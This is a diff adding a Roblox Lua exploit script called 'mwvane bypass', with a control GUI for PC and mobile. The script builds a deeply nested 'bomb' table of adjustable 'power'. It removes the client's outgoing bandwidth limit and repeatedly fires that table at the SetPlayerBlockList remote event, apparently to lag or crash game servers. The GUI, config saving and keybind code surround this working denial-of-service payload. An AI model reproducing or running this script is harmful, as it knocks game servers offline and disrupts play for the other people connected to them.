@@ -1,0 +1,563 @@
+repeat task.wait() until game:IsLoaded()
+
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local NetworkClient = game:GetService("NetworkClient")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+-- Cleanup old GUI
+local function CleanupOldGUIs()
+    local existing = CoreGui:FindFirstChild("mwvane bypass")
+    if existing then existing:Destroy() end
+end
+CleanupOldGUIs()
+
+-- Config (saves keybind, powers, mode, and spam delay)
+local ConfigFile = "mwvane bypass.json"
+local Config = { 
+    Keybind = "V", 
+    PCPower = 97000,      -- PC power: 10k-150k
+    MobilePower = 72000,  -- Mobile power: 10k-100k
+    Mode = "PC",          -- "PC" or "Mobile"
+    SpamDelay = 0.125     -- seconds between fires (preset v1 = 0.125, v2 = 0.12)
+}
+
+local function SaveConfig()
+    if writefile then
+        pcall(function() writefile(ConfigFile, HttpService:JSONEncode(Config)) end)
+    end
+end
+
+local function LoadConfig()
+    if isfile and isfile(ConfigFile) then
+        local success, data = pcall(function() return HttpService:JSONDecode(readfile(ConfigFile)) end)
+        if success and data then
+            if type(data.Keybind) == "string" then Config.Keybind = data.Keybind end
+            if type(data.PCPower) == "number" then Config.PCPower = math.clamp(data.PCPower, 10000, 150000) end
+            if type(data.MobilePower) == "number" then Config.MobilePower = math.clamp(data.MobilePower, 10000, 100000) end
+            if type(data.Mode) == "string" and (data.Mode == "PC" or data.Mode == "Mobile") then Config.Mode = data.Mode end
+            if type(data.SpamDelay) == "number" then Config.SpamDelay = (data.SpamDelay == 0.125 or data.SpamDelay == 0.12) and data.SpamDelay or 0.125 end
+        end
+    end
+end
+LoadConfig()
+
+-- Fixed bomb parameters
+local DEPTH = 296
+
+local function buildBomb(power)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, DEPTH do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maxRep = math.floor(power / (DEPTH + 2))
+    for i = 1, maxRep do
+        table.insert(maintable, spammedtable)
+    end
+    return maintable
+end
+
+-- Helper: get version name from delay
+local function getVersionName(delay)
+    return delay == 0.125 and "v1" or "v2"
+end
+
+-- Unified GUI - Black theme for both modes
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "mwvane bypass"
+ScreenGui.Parent = CoreGui
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+MainFrame.Position = UDim2.new(0.5, -120, 0.5, -110)
+MainFrame.Size = UDim2.new(0, 240, 0, 220)
+MainFrame.ClipsDescendants = true
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
+local MainStroke = Instance.new("UIStroke", MainFrame)
+MainStroke.Color = Color3.fromRGB(60, 60, 60)
+MainStroke.Thickness = 1.5
+
+-- Header with Mode Switch
+local Header = Instance.new("Frame")
+Header.Parent = MainFrame
+Header.BackgroundTransparency = 1
+Header.Size = UDim2.new(1, 0, 0, 50)
+
+local Title = Instance.new("TextLabel", Header)
+Title.BackgroundTransparency = 1
+Title.Position = UDim2.new(0, 15, 0, 0)
+Title.Size = UDim2.new(0.5, -15, 1, 0)
+Title.Font = Enum.Font.GothamBold
+Title.Text = "mwvane bypass"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 14
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+local ModeSwitchBtn = Instance.new("TextButton", Header)
+ModeSwitchBtn.Position = UDim2.new(0.55, 0, 0.5, -16)
+ModeSwitchBtn.Size = UDim2.new(0, 90, 0, 32)
+ModeSwitchBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+ModeSwitchBtn.Font = Enum.Font.GothamBold
+ModeSwitchBtn.Text = Config.Mode == "PC" and "PC" or "MOBILE"
+ModeSwitchBtn.TextColor3 = Config.Mode == "PC" and Color3.fromRGB(66, 135, 245) or Color3.fromRGB(245, 66, 66)
+ModeSwitchBtn.TextSize = 14
+ModeSwitchBtn.AutoButtonColor = false
+Instance.new("UICorner", ModeSwitchBtn).CornerRadius = UDim.new(0, 8)
+local ModeBtnStroke = Instance.new("UIStroke", ModeSwitchBtn)
+ModeBtnStroke.Color = Color3.fromRGB(60, 60, 60)
+ModeBtnStroke.Thickness = 1
+
+-- Scroll/Container for content
+local ContentFrame = Instance.new("ScrollingFrame")
+ContentFrame.Parent = MainFrame
+ContentFrame.BackgroundTransparency = 1
+ContentFrame.Position = UDim2.new(0, 0, 0, 55)
+ContentFrame.Size = UDim2.new(1, 0, 1, -55)
+ContentFrame.ScrollBarThickness = 4
+ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+
+local Container = Instance.new("Frame")
+Container.Parent = ContentFrame
+Container.BackgroundTransparency = 1
+Container.Size = UDim2.new(1, -20, 0, 0)
+Container.Position = UDim2.new(0, 10, 0, 0)
+
+local UIList = Instance.new("UIListLayout", Container)
+UIList.SortOrder = Enum.SortOrder.LayoutOrder
+UIList.Padding = UDim.new(0, 8)
+
+local function updateCanvas()
+    ContentFrame.CanvasSize = UDim2.new(0, 0, 0, Container.AbsoluteSize.Y + 10)
+end
+UIList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)
+task.defer(updateCanvas)
+
+-- ===== PC MODE ELEMENTS =====
+local PCElements = Instance.new("Frame", Container)
+PCElements.Size = UDim2.new(1, 0, 0, 0)
+PCElements.BackgroundTransparency = 1
+PCElements.Visible = Config.Mode == "PC"
+
+local PCUIList = Instance.new("UIListLayout", PCElements)
+PCUIList.SortOrder = Enum.SortOrder.LayoutOrder
+PCUIList.Padding = UDim.new(0, 8)
+
+-- PC Toggle Button
+local PCToggleBtn = Instance.new("TextButton", PCElements)
+PCToggleBtn.Size = UDim2.new(1, 0, 0, 35)
+PCToggleBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+PCToggleBtn.Font = Enum.Font.GothamBold
+PCToggleBtn.Text = "STATUS: DISABLED"
+PCToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+PCToggleBtn.TextSize = 13
+PCToggleBtn.AutoButtonColor = false
+Instance.new("UICorner", PCToggleBtn).CornerRadius = UDim.new(0, 8)
+local PCBtnStroke = Instance.new("UIStroke", PCToggleBtn)
+PCBtnStroke.Color = Color3.fromRGB(60, 60, 60)
+PCBtnStroke.Thickness = 1
+
+-- PC Keybind Row
+local PCKeybindContainer = Instance.new("Frame", PCElements)
+PCKeybindContainer.Size = UDim2.new(1, 0, 0, 25)
+PCKeybindContainer.BackgroundTransparency = 1
+local PCKeybindLabel = Instance.new("TextLabel", PCKeybindContainer)
+PCKeybindLabel.Size = UDim2.new(0.5, 0, 1, 0)
+PCKeybindLabel.BackgroundTransparency = 1
+PCKeybindLabel.Font = Enum.Font.Gotham
+PCKeybindLabel.Text = "Toggle Keybind:"
+PCKeybindLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+PCKeybindLabel.TextSize = 12
+PCKeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
+local PCKeybindBtn = Instance.new("TextButton", PCKeybindContainer)
+PCKeybindBtn.Position = UDim2.new(0.6, 0, 0, 0)
+PCKeybindBtn.Size = UDim2.new(0, 70, 1, 0)
+PCKeybindBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+PCKeybindBtn.Font = Enum.Font.GothamBold
+PCKeybindBtn.Text = Config.Keybind
+PCKeybindBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+PCKeybindBtn.TextSize = 12
+Instance.new("UICorner", PCKeybindBtn).CornerRadius = UDim.new(0, 5)
+
+-- PC Power Input Row
+local PCPowerContainer = Instance.new("Frame", PCElements)
+PCPowerContainer.Size = UDim2.new(1, 0, 0, 25)
+PCPowerContainer.BackgroundTransparency = 1
+local PCPowerLabel = Instance.new("TextLabel", PCPowerContainer)
+PCPowerLabel.Size = UDim2.new(0.5, 0, 1, 0)
+PCPowerLabel.BackgroundTransparency = 1
+PCPowerLabel.Font = Enum.Font.Gotham
+PCPowerLabel.Text = "Power (10k-150k):"
+PCPowerLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+PCPowerLabel.TextSize = 12
+PCPowerLabel.TextXAlignment = Enum.TextXAlignment.Left
+local PCPowerInput = Instance.new("TextBox", PCPowerContainer)
+PCPowerInput.Position = UDim2.new(0.6, 0, 0, 0)
+PCPowerInput.Size = UDim2.new(0, 70, 1, 0)
+PCPowerInput.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+PCPowerInput.Font = Enum.Font.GothamBold
+PCPowerInput.Text = tostring(Config.PCPower)
+PCPowerInput.TextColor3 = Color3.fromRGB(200, 200, 200)
+PCPowerInput.TextSize = 12
+PCPowerInput.ClearTextOnFocus = false
+Instance.new("UICorner", PCPowerInput).CornerRadius = UDim.new(0, 5)
+local PCPowerStroke = Instance.new("UIStroke", PCPowerInput)
+PCPowerStroke.Color = Color3.fromRGB(50, 50, 50)
+PCPowerStroke.Thickness = 1
+
+-- PRESET BUTTONS (v1 / v2) for PC
+local PresetRowPC = Instance.new("Frame", PCElements)
+PresetRowPC.Size = UDim2.new(1, 0, 0, 30)
+PresetRowPC.BackgroundTransparency = 1
+
+local Preset1PC = Instance.new("TextButton", PresetRowPC)
+Preset1PC.Size = UDim2.new(0.48, 0, 1, 0)
+Preset1PC.Position = UDim2.new(0, 0, 0, 0)
+Preset1PC.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Preset1PC.Font = Enum.Font.GothamBold
+Preset1PC.Text = "v1"
+Preset1PC.TextColor3 = Color3.fromRGB(200, 200, 200)
+Preset1PC.TextSize = 12
+Instance.new("UICorner", Preset1PC).CornerRadius = UDim.new(0, 6)
+
+local Preset2PC = Instance.new("TextButton", PresetRowPC)
+Preset2PC.Size = UDim2.new(0.48, 0, 1, 0)
+Preset2PC.Position = UDim2.new(0.52, 0, 0, 0)
+Preset2PC.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Preset2PC.Font = Enum.Font.GothamBold
+Preset2PC.Text = "v2"
+Preset2PC.TextColor3 = Color3.fromRGB(200, 200, 200)
+Preset2PC.TextSize = 12
+Instance.new("UICorner", Preset2PC).CornerRadius = UDim.new(0, 6)
+
+-- PC Footer (shows version name)
+local PCFooter = Instance.new("TextLabel", PCElements)
+PCFooter.BackgroundTransparency = 1
+PCFooter.Size = UDim2.new(1, 0, 0, 15)
+PCFooter.Font = Enum.Font.Gotham
+PCFooter.Text = "Mobile:72k || PC:97k | Ver: " .. getVersionName(Config.SpamDelay)
+PCFooter.TextColor3 = Color3.fromRGB(120, 120, 120)
+PCFooter.TextSize = 10
+
+-- ===== MOBILE MODE ELEMENTS =====
+local MobileElements = Instance.new("Frame", Container)
+MobileElements.Size = UDim2.new(1, 0, 0, 0)
+MobileElements.BackgroundTransparency = 1
+MobileElements.Visible = Config.Mode == "Mobile"
+
+local MobileUIList = Instance.new("UIListLayout", MobileElements)
+MobileUIList.SortOrder = Enum.SortOrder.LayoutOrder
+MobileUIList.Padding = UDim.new(0, 8)
+
+-- Mobile Toggle Button
+local MobileToggleBtn = Instance.new("TextButton", MobileElements)
+MobileToggleBtn.Size = UDim2.new(1, 0, 0, 35)
+MobileToggleBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+MobileToggleBtn.Font = Enum.Font.GothamBold
+MobileToggleBtn.Text = "OFF"
+MobileToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+MobileToggleBtn.TextSize = 13
+MobileToggleBtn.AutoButtonColor = false
+Instance.new("UICorner", MobileToggleBtn).CornerRadius = UDim.new(0, 8)
+local MobileBtnStroke = Instance.new("UIStroke", MobileToggleBtn)
+MobileBtnStroke.Color = Color3.fromRGB(60, 60, 60)
+MobileBtnStroke.Thickness = 1
+
+-- Mobile Power Input Row
+local MobilePowerContainer = Instance.new("Frame", MobileElements)
+MobilePowerContainer.Size = UDim2.new(1, 0, 0, 25)
+MobilePowerContainer.BackgroundTransparency = 1
+local MobilePowerLabel = Instance.new("TextLabel", MobilePowerContainer)
+MobilePowerLabel.Size = UDim2.new(0.5, 0, 1, 0)
+MobilePowerLabel.BackgroundTransparency = 1
+MobilePowerLabel.Font = Enum.Font.Gotham
+MobilePowerLabel.Text = "Power (10k-100k):"
+MobilePowerLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+MobilePowerLabel.TextSize = 12
+MobilePowerLabel.TextXAlignment = Enum.TextXAlignment.Left
+local MobilePowerInput = Instance.new("TextBox", MobilePowerContainer)
+MobilePowerInput.Position = UDim2.new(0.6, 0, 0, 0)
+MobilePowerInput.Size = UDim2.new(0, 70, 1, 0)
+MobilePowerInput.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MobilePowerInput.Font = Enum.Font.GothamBold
+MobilePowerInput.Text = tostring(Config.MobilePower)
+MobilePowerInput.TextColor3 = Color3.fromRGB(200, 200, 200)
+MobilePowerInput.TextSize = 12
+MobilePowerInput.ClearTextOnFocus = false
+Instance.new("UICorner", MobilePowerInput).CornerRadius = UDim.new(0, 5)
+local MobilePowerStroke = Instance.new("UIStroke", MobilePowerInput)
+MobilePowerStroke.Color = Color3.fromRGB(50, 50, 50)
+MobilePowerStroke.Thickness = 1
+
+-- PRESET BUTTONS (v1 / v2) for Mobile
+local PresetRowMobile = Instance.new("Frame", MobileElements)
+PresetRowMobile.Size = UDim2.new(1, 0, 0, 30)
+PresetRowMobile.BackgroundTransparency = 1
+
+local Preset1Mobile = Instance.new("TextButton", PresetRowMobile)
+Preset1Mobile.Size = UDim2.new(0.48, 0, 1, 0)
+Preset1Mobile.Position = UDim2.new(0, 0, 0, 0)
+Preset1Mobile.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Preset1Mobile.Font = Enum.Font.GothamBold
+Preset1Mobile.Text = "v1"
+Preset1Mobile.TextColor3 = Color3.fromRGB(200, 200, 200)
+Preset1Mobile.TextSize = 12
+Instance.new("UICorner", Preset1Mobile).CornerRadius = UDim.new(0, 6)
+
+local Preset2Mobile = Instance.new("TextButton", PresetRowMobile)
+Preset2Mobile.Size = UDim2.new(0.48, 0, 1, 0)
+Preset2Mobile.Position = UDim2.new(0.52, 0, 0, 0)
+Preset2Mobile.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Preset2Mobile.Font = Enum.Font.GothamBold
+Preset2Mobile.Text = "v2"
+Preset2Mobile.TextColor3 = Color3.fromRGB(200, 200, 200)
+Preset2Mobile.TextSize = 12
+Instance.new("UICorner", Preset2Mobile).CornerRadius = UDim.new(0, 6)
+
+-- Mobile Footer (shows version name)
+local MobileFooter = Instance.new("TextLabel", MobileElements)
+MobileFooter.BackgroundTransparency = 1
+MobileFooter.Size = UDim2.new(1, 0, 0, 15)
+MobileFooter.Font = Enum.Font.Gotham
+MobileFooter.Text = "Power: " .. tostring(Config.MobilePower) .. " | Ver: " .. getVersionName(Config.SpamDelay)
+MobileFooter.TextColor3 = Color3.fromRGB(120, 120, 120)
+MobileFooter.TextSize = 10
+
+-- ===== LOGIC =====
+local running = false
+local bomb = nil
+local spamThread = nil
+local currentMode = Config.Mode
+local currentDelay = Config.SpamDelay
+
+local function getCurrentPower()
+    return currentMode == "PC" and Config.PCPower or Config.MobilePower
+end
+
+local function restartSpamLoop()
+    if running then
+        if spamThread then task.cancel(spamThread) end
+        local power = getCurrentPower()
+        bomb = buildBomb(power)
+        spamThread = task.spawn(function()
+            while running do
+                if bomb then
+                    pcall(function()
+                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
+                    end)
+                end
+                task.wait(currentDelay)
+            end
+        end)
+    end
+end
+
+local function TogglePCBypass()
+    running = not running
+    if running then
+        PCToggleBtn.Text = "STATUS: ENABLED"
+        PCToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 100)
+        PCBtnStroke.Color = Color3.fromRGB(0, 255, 100)
+        MainStroke.Color = Color3.fromRGB(66, 135, 245)
+        ModeBtnStroke.Color = Color3.fromRGB(66, 135, 245)
+        NetworkClient:SetOutgoingKBPSLimit(math.huge)
+        restartSpamLoop()
+    else
+        PCToggleBtn.Text = "STATUS: DISABLED"
+        PCToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+        PCBtnStroke.Color = Color3.fromRGB(60, 60, 60)
+        MainStroke.Color = Color3.fromRGB(60, 60, 60)
+        ModeBtnStroke.Color = Color3.fromRGB(60, 60, 60)
+        if spamThread then task.cancel(spamThread) end
+        bomb = nil
+        NetworkClient:SetOutgoingKBPSLimit(0)
+    end
+end
+
+local function ToggleMobileBypass()
+    running = not running
+    if running then
+        MobileToggleBtn.Text = "ON"
+        MobileToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 100)
+        MobileBtnStroke.Color = Color3.fromRGB(0, 255, 100)
+        MainStroke.Color = Color3.fromRGB(245, 66, 66)
+        ModeBtnStroke.Color = Color3.fromRGB(245, 66, 66)
+        NetworkClient:SetOutgoingKBPSLimit(math.huge)
+        restartSpamLoop()
+    else
+        MobileToggleBtn.Text = "OFF"
+        MobileToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+        MobileBtnStroke.Color = Color3.fromRGB(60, 60, 60)
+        MainStroke.Color = Color3.fromRGB(60, 60, 60)
+        ModeBtnStroke.Color = Color3.fromRGB(60, 60, 60)
+        if spamThread then task.cancel(spamThread) end
+        bomb = nil
+        NetworkClient:SetOutgoingKBPSLimit(0)
+    end
+end
+
+-- Preset function (changes delay, updates footers, restarts if needed)
+local function setSpamDelay(newDelay)
+    if newDelay ~= 0.125 and newDelay ~= 0.12 then return end
+    currentDelay = newDelay
+    Config.SpamDelay = newDelay
+    SaveConfig()
+    
+    local versionName = getVersionName(newDelay)
+    PCFooter.Text = "Mobile:72k || PC:97k | Ver: " .. versionName
+    MobileFooter.Text = "Power: " .. tostring(Config.MobilePower) .. " | Ver: " .. versionName
+    
+    if running then
+        restartSpamLoop()
+    end
+end
+
+-- Connect preset buttons
+Preset1PC.MouseButton1Click:Connect(function() setSpamDelay(0.125) end)
+Preset2PC.MouseButton1Click:Connect(function() setSpamDelay(0.12) end)
+Preset1Mobile.MouseButton1Click:Connect(function() setSpamDelay(0.125) end)
+Preset2Mobile.MouseButton1Click:Connect(function() setSpamDelay(0.12) end)
+
+-- Mode switching
+local function SwitchMode()
+    if running then
+        running = false
+        if spamThread then task.cancel(spamThread) end
+        bomb = nil
+        NetworkClient:SetOutgoingKBPSLimit(0)
+        PCToggleBtn.Text = "STATUS: DISABLED"
+        PCToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+        PCBtnStroke.Color = Color3.fromRGB(60, 60, 60)
+        MobileToggleBtn.Text = "OFF"
+        MobileToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
+        MobileBtnStroke.Color = Color3.fromRGB(60, 60, 60)
+        MainStroke.Color = Color3.fromRGB(60, 60, 60)
+        ModeBtnStroke.Color = Color3.fromRGB(60, 60, 60)
+    end
+    
+    currentMode = currentMode == "PC" and "Mobile" or "PC"
+    Config.Mode = currentMode
+    
+    PCElements.Visible = currentMode == "PC"
+    MobileElements.Visible = currentMode == "Mobile"
+    
+    if currentMode == "PC" then
+        ModeSwitchBtn.Text = "PC"
+        ModeSwitchBtn.TextColor3 = Color3.fromRGB(66, 135, 245)
+    else
+        ModeSwitchBtn.Text = "MOBILE"
+        ModeSwitchBtn.TextColor3 = Color3.fromRGB(245, 66, 66)
+    end
+    
+    SaveConfig()
+    updateCanvas()
+end
+
+PCToggleBtn.MouseButton1Click:Connect(function()
+    if currentMode == "PC" then TogglePCBypass() end
+end)
+MobileToggleBtn.MouseButton1Click:Connect(function()
+    if currentMode == "Mobile" then ToggleMobileBypass() end
+end)
+ModeSwitchBtn.MouseButton1Click:Connect(SwitchMode)
+
+-- Power inputs
+PCPowerInput.FocusLost:Connect(function()
+    local numericValue = tonumber(PCPowerInput.Text)
+    if numericValue then
+        local clampedValue = math.clamp(numericValue, 10000, 150000)
+        Config.PCPower = clampedValue
+        PCPowerInput.Text = tostring(clampedValue)
+    else
+        Config.PCPower = 97000
+        PCPowerInput.Text = "97000"
+    end
+    SaveConfig()
+    if running and currentMode == "PC" then restartSpamLoop() end
+end)
+
+MobilePowerInput.FocusLost:Connect(function()
+    local numericValue = tonumber(MobilePowerInput.Text)
+    if numericValue then
+        local clampedValue = math.clamp(numericValue, 10000, 100000)
+        Config.MobilePower = clampedValue
+        MobilePowerInput.Text = tostring(clampedValue)
+    else
+        Config.MobilePower = 72000
+        MobilePowerInput.Text = "72000"
+    end
+    MobileFooter.Text = "Power: " .. tostring(Config.MobilePower) .. " | Ver: " .. getVersionName(currentDelay)
+    SaveConfig()
+    if running and currentMode == "Mobile" then restartSpamLoop() end
+end)
+
+-- Keybind
+local listeningForKey = false
+PCKeybindBtn.MouseButton1Click:Connect(function()
+    listeningForKey = true
+    PCKeybindBtn.Text = "..."
+    PCKeybindBtn.TextColor3 = Color3.fromRGB(255, 200, 100)
+end)
+UserInputService.InputBegan:Connect(function(input, processed)
+    if processed then return end
+    if listeningForKey then
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            Config.Keybind = input.KeyCode.Name
+            PCKeybindBtn.Text = Config.Keybind
+            PCKeybindBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+            listeningForKey = false
+            SaveConfig()
+        end
+    else
+        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == Config.Keybind then
+            if currentMode == "PC" then TogglePCBypass() end
+        end
+    end
+end)
+
+-- Draggable
+local dragging, dragStart, startPos
+Header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
+end)
+
+-- Initialize GUI
+PCKeybindBtn.Text = Config.Keybind
+PCPowerInput.Text = tostring(Config.PCPower)
+MobilePowerInput.Text = tostring(Config.MobilePower)
+currentDelay = Config.SpamDelay
+local versionDisplay = getVersionName(currentDelay)
+PCFooter.Text = "Mobile:72k || PC:97k | Ver: " .. versionDisplay
+MobileFooter.Text = "Power: " .. tostring(Config.MobilePower) .. " | Ver: " .. versionDisplay
+PCElements.Visible = Config.Mode == "PC"
+MobileElements.Visible = Config.Mode == "Mobile"
+if Config.Mode == "PC" then
+    ModeSwitchBtn.Text = "PC"
+    ModeSwitchBtn.TextColor3 = Color3.fromRGB(66, 135, 245)
+else
+    ModeSwitchBtn.Text = "MOBILE"
+    ModeSwitchBtn.TextColor3 = Color3.fromRGB(245, 66, 66)
+end
+updateCanvas()
